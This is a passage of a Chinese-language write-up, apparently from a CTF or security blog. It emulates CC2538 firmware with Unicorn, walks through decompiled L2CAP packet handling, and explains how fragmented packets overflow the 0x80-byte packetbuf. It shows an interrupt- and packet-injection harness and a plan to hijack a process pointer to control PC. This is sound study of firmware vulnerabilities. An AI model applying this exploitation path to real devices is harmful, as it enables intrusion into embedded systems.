+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">hook_block</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
+  <span class="k">global</span> <span class="n">interrupted</span>
+
+  <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook block] 0x</span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+
+  <span class="c1"># interrupt </span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x203D5A</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">interrupted</span><span class="p">):</span>
+
+      <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Interrupted...&#34;</span><span class="p">)</span>
+      <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+      <span class="c1"># interrupted = True</span>
+      <span class="n">interrupted</span> <span class="o">=</span> <span class="kc">True</span>
+
+      <span class="c1"># save registers</span>
+      <span class="n">ptrs</span> <span class="o">=</span> <span class="p">{}</span>
+      <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
+          <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">]</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
+      <span class="n">pc</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_PC</span><span class="p">)</span>
+          
+      <span class="c1"># execute functions</span>
+      <span class="n">interrupt_no</span> <span class="o">=</span> <span class="mi">158</span>
+      <span class="n">interrupt_func</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">interrupt_no</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">4</span><span class="p">))</span>
+      <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">interrupt_func</span><span class="p">,</span> <span class="mh">0x203B1C</span><span class="p">)</span>
+
+      <span class="c1"># restore</span>
+      <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
+          <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">])</span>    <span class="c1"># how to deal with stack?</span>
+      <span class="c1"># mu.reg_write(UC_ARM_REG_PC, pc)</span>
+
+      <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ok&#34;</span><span class="p">)</span>
+
+      <span class="c1"># mu.emu_start(0x203D5A, 0x00210768)</span>
+
+      <span class="n">exit</span><span class="p">()</span>
+
+  <span class="k">pass</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>然后发现就可以走到 <code>cc2538_rf_rx_tx_isr</code> 函数了，并触发了从 MMIO 读取网卡数据包的 <code>read</code> 函数。我们按照 MMIO pattern 就可以构造网络包了：先向 0x40088828 地址处塞 4 字节表示长度，然后每次向 0x40088828 地址处塞<strong>一个</strong>字节作为数据。这里也可以发现 <code>bufsize</code> 定死为 0x80，为我们后续的利用增添了不少麻烦。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="n">bufsize</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// r0
+</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// r3
+</span><span class="c1"></span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">bufsize</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x40088828</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">bufsize</span> <span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x40088828</span><span class="p">];</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">result</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">)</span>
+    <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x40088828</span><span class="p">];</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>好，我们修改一下 <code>hook_mem_read</code> 来模拟硬件行为，随便塞点什么到 MMIO。然后修改 <code>hook_code</code> 在 <code>input</code> 函数开始时验证一下数据有没有成功输入。结果显示成功了！</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">data_ptr</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">data_len</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">def</span> <span class="nf">hook_code</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">data_len</span><span class="p">,</span> <span class="n">data_ptr</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DBA</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DBA: get_channel_for_cid, l2cap_channel_count &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">),</span> <span class="n">u8</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="mh">0x20002D76</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202D9C</span><span class="p">):</span>
+        <span class="n">data_ptr</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202D9C: packetbuf_dataptr &#34;</span><span class="p">,</span> <span class="n">data_ptr</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DA2</span><span class="p">):</span>
+        <span class="n">data_len</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DA2: packetbuf_datalen &#34;</span><span class="p">,</span> <span class="n">data_len</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;data: &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">data_ptr</span><span class="p">,</span> <span class="n">data_len</span><span class="p">))</span>
+
+<span class="n">packet_injected</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="c1"># memory pattern</span>
+<span class="c1"># to inject a packget of p32(0x20) + &#39;a&#39;*0x20</span>
+<span class="n">packet_body</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)]</span>
+<span class="n">packet</span> <span class="o">=</span> <span class="p">[</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)]</span> <span class="o">+</span> <span class="n">packet_body</span>
+
+<span class="k">def</span> <span class="nf">hook_mem_read</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">packet_injected</span><span class="p">,</span> <span class="n">packet</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook_mem_read] </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">packet_injected</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
+            <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">packet</span><span class="p">[</span><span class="n">packet_injected</span><span class="p">])</span>
+            <span class="n">packet_injected</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x4000000</span><span class="p">])</span>   <span class="c1"># to bypass sys_ctrl_init, random_init</span>
+            <span class="c1"># print(f&#34;content: {mu.mem_read(address, 4)}, ready to write random: {r}&#34;)</span>
+            <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这样我们成功走到了漏洞函数，并且把 <code>packetbuf</code> 成功输入成了 0x20 个字符 a。</p>
+<h6 id="如何触发漏洞">如何触发漏洞</h6>
+<p>可以看到 <code>process_thread_cc2538_rf_process</code> 中会向 <code>packetbuf_dataptr</code> 处读最多 0x80 字节，而在 .bss 为其分配的空间就是 0x80，暂时也没什么发现什么问题。随着理解代码的深入，可以认为网络包一次只能收最多 0x80 字节，每一个网络包的数据都会被拷贝到 <code>packetbuf_dataptr</code> 中。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="kr">__fastcall</span> <span class="nf">process_thread_cc2538_rf_process</span><span class="p">(</span><span class="n">pt</span> <span class="o">*</span><span class="n">process_pt</span><span class="p">,</span> <span class="n">process_event_t</span> <span class="n">ev</span><span class="p">,</span> <span class="n">process_data_t</span> <span class="n">data</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="p">...</span>
+  <span class="n">packetbuf_clear</span><span class="p">();</span>
+  <span class="n">v6</span> <span class="o">=</span> <span class="n">packetbuf_dataptr</span><span class="p">();</span>
+  <span class="n">v7</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="mh">0x80u</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">packetbuf_set_datalen</span><span class="p">(</span><span class="n">v7</span><span class="p">);</span>
+    <span class="n">input</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>要触发漏洞，我们必须要弄清楚 channel 是干什么的，即如何让 <code>channel-&gt;rx_buffer.current_index</code> 超过 0x80 造成溢出。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">input_l2cap_frame_flow_channel</span><span class="p">(</span><span class="n">l2cap_channel_t</span> <span class="o">*</span><span class="n">channel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint16_t</span> <span class="n">data_len</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="p">...</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu_length</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
+    <span class="n">current_index</span> <span class="o">=</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">current_index</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v4</span> <span class="o">&gt;</span> <span class="mi">1280</span> <span class="o">-</span> <span class="n">current_index</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">curr_log_level_mac</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
+        <span class="k">goto</span> <span class="n">LABEL_5</span><span class="p">;</span>
+      <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu</span><span class="p">[</span><span class="n">current_index</span><span class="p">],</span> <span class="n">data</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">);</span>
+    <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">current_index</span> <span class="o">+=</span> <span class="n">v4</span><span class="p">;</span>
+<span class="nl">LABEL_10</span><span class="p">:</span>                                      
+    <span class="k">if</span> <span class="p">(</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu_length</span> <span class="o">&amp;&amp;</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu_length</span> <span class="o">==</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">current_index</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">v6</span> <span class="o">=</span> <span class="n">packetbuf_dataptr</span><span class="p">();</span>
+      <span class="n">memcpy</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">,</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu_length</span><span class="p">);</span> <span class="c1">//vuln
+</span><span class="c1"></span>      <span class="p">...</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>   
+</code></pre></td></tr></table>
+</div>
+</div><p>而这个 channel 是在 <code>input</code> 中通过 <code>get_channel_for_cid</code> 得到的，传给后者的参数显然可控。只需要让 <code>channel_for_cid</code> 不为零就能走到漏洞分支。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">input</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">packetbuf_dataptr</span><span class="p">();</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="n">packetbuf_datalen</span><span class="p">();</span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">packetbuf_attr_0</span><span class="p">(</span><span class="mh">0xBu</span><span class="p">);</span>
+  <span class="p">...</span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="n">channel_for_cid</span> <span class="o">=</span> <span class="n">get_channel_for_cid</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
+  <span class="p">...</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">5</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">input_l2cap_frame_signal_channel</span><span class="p">(</span><span class="n">v0</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
+    <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span> <span class="c1">// return
+</span><span class="c1"></span>  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">channel_for_cid</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">input_l2cap_frame_flow_channel</span><span class="p">(</span><span class="n">channel_for_cid</span><span class="p">,</span> <span class="n">v0</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span><span class="c1">// vul
+</span><span class="c1"></span>    <span class="p">...</span>
+    <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span> <span class="c1">// return
+</span><span class="c1"></span>  <span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>代码逻辑即将浮出水面，再来看 <code>get_channel_for_cid</code>，查看 l2cap_channel_count 的交叉引用发现在 <code>input_l2cap_conn_req</code> 中改变，而上个代码段中 <code>input_l2cap_frame_signal_channel</code> 恰好会调用此函数。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">l2cap_channel_t</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">get_channel_for_cid</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">own_cid</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// r0
+</span><span class="c1"></span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int16</span><span class="p">)(</span><span class="n">own_cid</span> <span class="o">-</span> <span class="mh">0x41</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="n">l2cap_channel_count</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">return</span> <span class="o">&amp;</span><span class="n">l2cap_channels</span><span class="p">[</span><span class="n">v1</span><span class="p">];</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>那么看上去我们得先进 <code>input_l2cap_frame_signal_channel</code> 来增加 channel</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">input_l2cap_frame_signal_channel</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="n">data_len</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// r3
+</span><span class="c1"></span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+  <span class="k">switch</span> <span class="p">(</span> <span class="n">v3</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">case</span> <span class="mi">20</span><span class="o">:</span>
+      <span class="n">input_l2cap_conn_req</span><span class="p">(</span><span class="n">data</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="p">...</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>增加完 channel 后我们就能成功进入漏洞函数 <code>input_l2cap_frame_flow_channel</code> 了。这个函数大概逻辑是：维护一个比 0x80 bytes 的更大（0x504 bytes）的缓冲区，如果网络包不分片（即只有一个网络包，其总大小域与当前片大小域相同），则把内容拷贝到缓冲区头部；如果网络包分片，则后续接收新的网络包会把内容不断接在后面，实现拼接；最终直到接收到的大小与第一个网络包总大小域的值相同，一次性地把这个大缓冲区的内容拷贝回 <code>packetbuf_dataptr</code>。而我们知道 <code>packetbuf_dataptr</code> 只有 0x80 bytes 大小，那么多构造几个分片包就能轻易实现溢出。</p>
+<p>所以总的来说我们要这么做：</p>
+<ol>
+<li>
+<p>触发 158 号中断，并精心构造网络包使其进入 <code>input</code> 的 <code>input_l2cap_frame_signal_channel</code> 分支。</p>
+</li>
+<li>
+<p>多次触发 158 号中断，并精心构造网络包使其进入 <code>input</code> 的 <code>input_l2cap_frame_flow_channel</code> 分支，最终触发越界拷贝。</p>
+</li>
+</ol>
+<p>要这么做就需要多次注入中断，不禁为前面使用的风雨飘摇破烂不堪的中断注入代码捏了把汗（但事实上好像没出太多问题）。由于 Unicorn 疑似不支持 WFI 指令，所以需要把 0x210768 处的代码 patch 掉，使其能模拟主函数中的循环。</p>
+<blockquote>
+<p>WFI 指令会将系统休眠，只有被中断才能唤醒后并继续执行，这样在实际环境中能大大减少能量消耗，并在一定程度上实现了响应式处理请求的场景，简直太智慧了。</p>
+</blockquote>
+<h6 id="控制-pc">控制 PC</h6>
+<p>接下来我们来写 exp。仔细观察一下，溢出发生在 .bss 段，而理论上来说我们可以向后无限溢出。后方可以看到一个相当有前途的结构体指针 <code>notification_process_0</code>，它代表了一个进程，而这个进程会被 161 号中断函数 <code>pka_isr</code> 问询，并挂到最前方。如果我们将其修改指向一段可控的内存，那么我们就可以伪造进程的关键数据。如果修改入口点，那么当该进程被运行时便控制了 PC。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">pka_isr</span><span class="p">()</span>
+<span class="p">{</span>
